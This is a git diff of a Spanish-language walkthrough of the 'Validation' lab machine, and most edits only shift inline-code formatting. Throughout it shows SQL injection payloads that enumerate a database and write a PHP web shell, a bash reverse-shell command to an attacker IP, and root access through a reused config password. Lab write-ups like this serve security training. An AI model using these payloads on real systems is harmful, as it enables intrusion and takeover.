@@ -28,13 +28,13 @@ image:
   
 ## Descripción
 
-`Validarion` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de una `sql injection into outfile` encontrada en su página web, obtendremos `acceso` a la `máquina víctima` mediante la creación de un `archivo .php` que nos permitirá `ejecución de comandos`, escalaremos privilegios debido a información privilegiada encontrada en un archivo de configuración
+Validarion es una máquina easy linux donde estaremos vulnerando la máquina a través de una sql injection into outfile encontrada en su página web, obtendremos acceso a la `máquina víctima` mediante la creación de un `archivo .php` que nos permitirá `ejecución de comandos`, escalaremos privilegios debido a información privilegiada encontrada en un archivo de configuración
 
 ---
 
 ## Reconocimiento
 
-Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
+Se comprueba que la `máquina` está activa y se determina su sistema operativo, el ttl de las máquinas linux suele ser 64, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
 
 ```
 # ping 10.129.95.235 
@@ -48,7 +48,7 @@ rtt min/avg/max/mdev = 58.104/58.104/58.104/0.000 ms
 
 ### Nmap
 
-Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap
+Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap
 
 ```
 # sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.235 -oG openPorts
@@ -76,7 +76,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
            Raw packets sent: 65966 (2.903MB) | Rcvd: 65990 (2.640MB)
 ```
 
-Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados
+Se procede a realizar un análisis de `detección de servicios y la identificación de versiones` utilizando los puertos abiertos encontrados
 
 ```
 # nmap -sCV -p22,80,4566,8080 10.129.95.235 -oN services                     
@@ -109,11 +109,11 @@ Nos dirigimos a la página web y se visualiza lo siguiente:
 
 ![](/assets/img/Validation/image_1.png)
 
-Cuando `añadimos` un `username` vemos esto en la ruta `/contact.php`
+Cuando `añadimos un username vemos esto en la ruta /contact.php`
 
 ![](/assets/img/Validation/image_2.png)
 
-He testeado una `inyección sql` en la parte del username pero no ha dado resultado, sin embargo, al probarla en la parte del `country` si que nos ha `devuelto` un `error`, por lo tanto estamos antes una `sql injection error based`
+He testeado una `inyección sql` en la parte del username pero no ha dado resultado, sin embargo, al probarla en la parte del country si que nos ha devuelto un error, por lo tanto estamos antes una sql injection error based
 
 ![](/assets/img/Validation/image_3.png)
 
@@ -125,7 +125,7 @@ Ahora vemos que no se ve el error
 
 ![](/assets/img/Validation/image_4.png)
 
-Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2 nos da error
+Nos encontramos ante una sola columna, debido a que si hacemos un order by 2 nos da error
 
 ```
 # username=test&country=Brazil' order by 1-- - 
@@ -133,7 +133,7 @@ Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2
 
 ![](/assets/img/Validation/image_5.png)
 
-`Identificamos` la `versión` y el `tipo base de datos` a la que nos enfrentamos
+Identificamos la `versión y el tipo base de datos` a la que nos enfrentamos
 
 ```
 # username=test&country=Brazil' union select version()-- - 
@@ -141,7 +141,7 @@ Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2
 
 ![](/assets/img/Validation/image_6.png)
 
-Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir la que se está `utilizando`
+Vemos la base de datos sobre la que estamos realizando la inyección, es decir la que se está utilizando
 
 ```
 # username=test&country=Brazil' union select database()-- - 
@@ -149,7 +149,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 
 ![](/assets/img/Validation/image_7.png)
 
-`Listamos` todas las `bases de datos`
+Listamos todas las bases de datos
 
 ```
 # username=test&country=Brazil' union select schema_name from information_schema.schemata-- - 
@@ -157,7 +157,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 
 ![](/assets/img/Validation/image_8.png)
 
-`Listamos` el nombre de todas las `tablas` que pertenecen a la base de datos registration
+Listamos el nombre de todas las tablas que pertenecen a la base de datos registration
 
 ```
 # username=test&country=Brazil' union select table_name from information_schema.tables where table_schema='registration'-- - 
@@ -165,7 +165,7 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 
 ![](/assets/img/Validation/image_9.png)
 
-`Listamos` todas las `columnas` para la base de datos registration y la tabla registration
+Listamos todas las columnas para la base de datos registration y la tabla registration
 
 ```
 # username=test&country=Brazil' union select column_name from information_schema.columns where table_schema='registration'-- - 
@@ -173,11 +173,11 @@ Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir
 
 ![](/assets/img/Validation/image_10.png)
 
-Comprobamos si hay algo interesante en las tablas `username` y `userhash`, pero no encontramos nada
+Comprobamos si hay algo interesante en las tablas username y userhash, pero no encontramos nada
 
 ![](/assets/img/Validation/image_11.png)
 
-Usando `wfuzz` hemos encontrado la ruta `/config.php`, si conseguimos ganar acceso a la máquina víctima quizá en este archivo exista información interesante
+Usando wfuzz hemos encontrado la ruta `/config.php`, si conseguimos ganar acceso a la máquina víctima quizá en este archivo exista información interesante
 
 ```
 # wfuzz -c -t100 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.95.235/FUZZ.php
@@ -218,7 +218,7 @@ Requests/sec.: 1018.026
 
 ## Intrusión
 
-Al acceder a la ruta `/config.php` no vemos nada porque el `código` php está siendo `interpretado`, sin embargo, podemos ver si a través de la inyección sql tenemos `permisos` de `escritura`, si es así podremos `inyectar código php` en algún archivo de esa ruta y ganar acceso a la máquina víctima
+Al acceder a la ruta `/config.php no vemos nada porque el código` php está siendo interpretado, sin embargo, podemos ver si a través de la inyección sql tenemos permisos de escritura, si es así podremos `inyectar código php` en algún archivo de esa ruta y ganar acceso a la máquina víctima
 
 ![](/assets/img/Validation/image_12.png)
 
@@ -226,19 +226,19 @@ Efectivamente ha funcionado, al acceder a `http://10.129.250.24/shell.php?cmd=wh
 
 ![](/assets/img/Validation/image_13.png)
 
-Por lo tanto vamos a mandarnos una `reverse shell` a nuestro equipo, lo primero es ponernos en escucha mediante `netcat` por el puerto `443`
+Por lo tanto vamos a mandarnos una reverse shell a nuestro equipo, lo primero es ponernos en escucha mediante netcat por el puerto 443
 
 ```
 # nc -nlvp 443
 ```
 
-Nos mandamos una `reverse shell` a nuestro equipo
+Nos mandamos una reverse shell a nuestro equipo
 
 ```
 # http://10.129.250.24/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.15/443 0>%261"
 ```
 
-Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`
+Una vez en la máquina víctima vamos a realizar un tratamiento a la TTY
 
 ```
 # nc -nlvp 443 
@@ -248,14 +248,14 @@ sh: 0: can't access tty; job control turned off
 $ 
 ```
 
-Obtenemos las `dimensiones` de nuestra `pantalla` 
+Obtenemos las dimensiones de nuestra pantalla 
 
 ```
 # stty size
 45 183
 ```
 
-Efectuamos el `tratamiento` a la `TTY`
+Efectuamos el tratamiento a la TTY
 
 ```
 # script /dev/null -c bash
@@ -273,7 +273,7 @@ Efectuamos el `tratamiento` a la `TTY`
 [ENTER]
 ```
 
-Ya tenemos un `consola` completamente `interactiva`
+Ya tenemos un consola completamente interactiva
 
 ```
 www-data@validation:/var/www/html$ whoami
@@ -282,7 +282,7 @@ www-data
 
 ## Privilege Escalation
 
-Lo siguiente que hacemos es `inspeccionar` el `config.php` que hemos encontrado y encontramos las `credenciales` del `usuario` uhc a la base de datos
+Lo siguiente que hacemos es inspeccionar el `config.php que hemos encontrado y encontramos las credenciales del usuario` uhc a la base de datos
 
 ```
 www-data@validation:/var/www/html$ cat config.php 
@@ -296,7 +296,7 @@ www-data@validation:/var/www/html$ cat config.php
 ?>
 ```
 
-Al inspeccionar el `/etc/passwd` nos damos cuenta que el único usuario que hay posible es root, así que probamos la contraseña `uhc-9qual-global-pw` para convertirnos en usuario `root` y funciona
+Al inspeccionar el `/etc/passwd` nos damos cuenta que el único usuario que hay posible es root, así que probamos la contraseña `uhc-9qual-global-pw para convertirnos en usuario root` y funciona
 
 ```
 www-data@validation:/var/www/html$ su root
